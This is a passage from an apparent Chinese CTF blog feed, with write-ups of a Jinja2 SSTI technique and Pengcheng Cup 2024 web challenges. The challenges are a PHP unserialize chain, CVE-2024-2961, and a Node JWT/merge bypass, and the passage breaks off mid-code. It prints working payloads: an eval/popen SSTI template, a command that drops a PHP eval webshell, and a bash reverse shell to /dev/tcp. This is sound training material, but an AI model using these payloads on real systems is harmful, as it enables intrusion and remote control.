class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模板语法 _ 命令执行_eval</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 脚本 用于寻找序号</span></span><br><span class="line">url = <span class="string">&quot;http://url/level/1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_eval</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">find_eval(url)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://hello-ctf.com/HC_Web/ssti/">hello_ctf，0基础入门</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">概念入门</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
            <tag> python ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹏城杯24</title>
      <link href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF24/"/>
      <url>/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现后感觉都不是很难，比赛时还是要多看看<br>还得练，不过最近高强度打比赛来说成长很快，也是差不多找到做题的感觉了，不过在做题中还是有点急，明明静下来更快的(<br>自知愚钝，日月兼程</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://err0r233.github.io/posts/10200.html">2024鹏城杯线上赛Web方向题解，这个大跌ak了？</a></li></ol><h2 id="fileread-php-cve"><a href="#fileread-php-cve" class="headerlink" title="fileread: php, cve"></a>fileread: php, cve</h2><ol><li><p>源码如下</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>构造一下pop链拿到file_get_contents()</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt; arr = <span class="keyword">array</span>(<span class="string">&quot;fileput&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt; cls = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="keyword">echo</span> base64-<span class="title function_ invoke__">encode</span>(<span class="variable">$res</span>)</span><br></pre></td></tr></table></figure></li><li><p>这里是在大哥b1nb1n的查阅下知道要用一个cve的，其实我也有一个想法 –&gt; <em><strong>当操作受限时需要到rce时就需要找切入点了，从最显目的出发，有一个是一个就好，查一查又没有关系!!!</strong></em>: php file_get_contents rce就可以搜索得到这个漏洞</p><ol><li>CVE-2024-2961，有配套脚本，适用于file_get_contents()，需要改一改，这底层不像是web的bro，更像是pwn的，原理有点高深<ol><li>利用思路：利用脚本执行了三个请求：首先下载&#x2F;proc&#x2F;self&#x2F;maps文件，并从中提取PHP堆的地址和libc库的文件名。接着下载libc二进制文件来提取system()函数的地址。最后执行一次最终请求来触发溢出并执行预设的任意命令</li><li><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">原作者底层原理</a></li><li><a href="https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py">官方脚本地址</a> –&gt; 改的在CtfSpt History里，总结就是慢慢看</li><li><a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">另一个人的脚本</a></li><li><a href="https://xz.aliyun.com/t/15549?time__1311=Gqjxn7itGQeWqGNDQiiQGkDuWgqOSGG0bD">别人的总结，看慢点bro，建议和官方脚本一起使用</a></li></ol></li><li>补充：据原作者描述该漏洞影响PHP 7.0.0 (2015) 到 8.3.7 (2024)近十年php版本的任何php应用程序（Wordpress、Laravel 等）。PHP的所有标准文件读取操作都受到了影响：file_get_contents()、file()、readfile()、fgets()、getimagesize()、SplFileObject-&gt;read()等。文件写入操作同样受到影响（如file_put_contents()及其同类函数）</li></ol></li><li><p>触发<code>python3 cnext-exploit.py http://192.168.18.24/ &quot;echo &#39;&lt;?php eval(\$_POST[\&quot;aaa\&quot;])?&gt;&#39; &gt; kc1zs4.php&quot;</code></p></li><li><p>然后是通过<code>ls -al /</code>查suid &#x2F;readflag</p></li></ol><h2 id="notadmin-复现-node-merge"><a href="#notadmin-复现-node-merge" class="headerlink" title="notadmin(复现): node merge"></a>notadmin(复现): node merge</h2><blockquote><p>比较可惜，差一点点就出来了，不会很难的一道题</p></blockquote><ol><li><p>附件中有源码</p><ol><li>一眼原型链污染？有hasOwnProperty()无法访问到原型，直接赋值了，不符合利用条件</li><li>crypto随机数非伪随机数</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="title class_">User</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;./user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;ejs&quot;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;views&quot;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;views&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;public&quot;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tmp_user = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">authenticateToken</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.<span class="property">headers</span>[<span class="string">&quot;authorization&quot;</span>];</span><br><span class="line">    <span class="keyword">const</span> token = authHeader;</span><br><span class="line">    <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, tmp_user.<span class="property">secretKey</span>);</span><br><span class="line">        req.<span class="property">user</span> = decoded;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid token.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b[c]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">check</span>(b[c])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                a.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp;</span><br><span class="line">                b.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> a[c] === <span class="string">&quot;object&quot;</span> &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> b[c] === <span class="string">&quot;object&quot;</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(a[c], b[c]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a[c] = b[c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tmp_user.<span class="property">secretKey</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> check = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input =</span><br><span class="line">        <span class="regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/gi</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;object&quot;</span> &amp;&amp; str !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(str[key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !input.<span class="title function_">test</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">merge</span>(tmp_user, req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="comment">// 直接污染secretKey就有了，但是下面要verifyLogin，而且merege中进行了过滤</span></span><br><span class="line">        <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">            tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">User</span>.<span class="title function_">verifyLogin</span>(tmp_user.<span class="property">password</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(</span><br><span class="line">                &#123; <span class="attr">username</span>: tmp_user.<span class="property">username</span> &#125;,</span><br><span class="line">                tmp_user.<span class="property">secretKey</span></span><br><span class="line">            );</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Login successful! Token: <span class="subst">$&#123;token&#125;</span>\nBut nothing happend~`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Login failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Hacker denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">authenticateToken</span>(req, res, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        backcode = <span class="built_in">eval</span>(tmp_user.<span class="property">code</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;something happend~&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>目的是要到eval那里，需要已经登录</p></li><li><p>jwt验证，<em><strong>jwt的关键在于密钥这个思想</strong></em>，要知道用户名但是通过逻辑可以知道各种属性都是存储在内存中且sercretKey不会强制赋值，所以可以通过merge污染一下</p></li><li><p>思路: 先login post后再&#x2F;，执行命令</p><ol><li>先&#x2F;login污染一下secretKey，设置一下code看看可不可以执行成功？测一个没污染secretKey和有污染secretKey的，结论是可以绕过</li><li>能不能判断code有无执行-&gt;逻辑上secretKey可以code也可以，可以通过报错？执行一个有错误的code会回到Invailed Token?因为异常上传了</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !!!成功绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://192.168.18.21&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. S1：访问/login设置tmp_user，第一步发一次就好</span></span><br><span class="line"></span><br><span class="line">postdata = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;nothing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,   <span class="comment"># 默认使用HS256</span></span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&quot;console.log(1)&quot;</span></span><br><span class="line">    <span class="comment"># 最后一步需要进行绕过bro，node命令执行绕过了,pp2rce几乎不可以</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(host + <span class="string">&quot;/login&quot;</span>, data=postdata)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. S2: 直接get/来进行命令执行</span></span><br><span class="line"></span><br><span class="line">getheader = &#123;</span><br><span class="line">    <span class="string">&quot;authorization&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IktDMXpzNCJ9.xXc8Q7Vx6lBHHJL7vNKbRcnfmpqfObThUS7dgXKT544&quot;</span></span><br><span class="line">    <span class="comment"># token，详见jwt.io</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(host,headers=getheader)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p>呜呜死在这里的绕过上了，不过也学到了node的绕过，<strong>强网Pyblockly</strong>中通过函数覆盖来逃脱检查，这里也一样，想过覆盖inpui没想到覆盖check，失误了</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先发包这个</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;kc1zs4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>:<span class="string">&quot;check=(str)=&gt;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再发payload即可，这里命名空间是在该文件中，eval执行的</span></span><br><span class="line"><span class="comment"># 经典反弹shell</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;kc1zs4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>:<span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Python口算-复现-python-ssti"><a href="#Python口算-复现-python-ssti" class="headerlink" title="Python口算(复现): python ssti"></a>Python口算(复现): python ssti</h2><blockquote><p>是不是小猿口算？</p></blockquote><ol><li><p>开局一个页面，肯定有信息传输，后台刷新这样，截获然后发出，只有脚本有这种速度</p></li><li><p>其实就是写一个根据字符串计算结果的python脚本，开整(差不多这个意思就对了)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://xxx&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment"># 假设直接返回表达式123+531*3=?</span></span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    res = <span class="built_in">eval</span>(r.text[<span class="number">0</span>:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    postData = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: res</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url, data=postData)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p>可以拿到hint，<code>/static/f4dd790b-bc4e-48de-b717-903d433c597f</code>，考虑render_template的模板注入执行，但是需要绕过，我也不知道黑白名单是啥啊bro(本来昨天应该看这道的，比绕过notadmin好多了)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 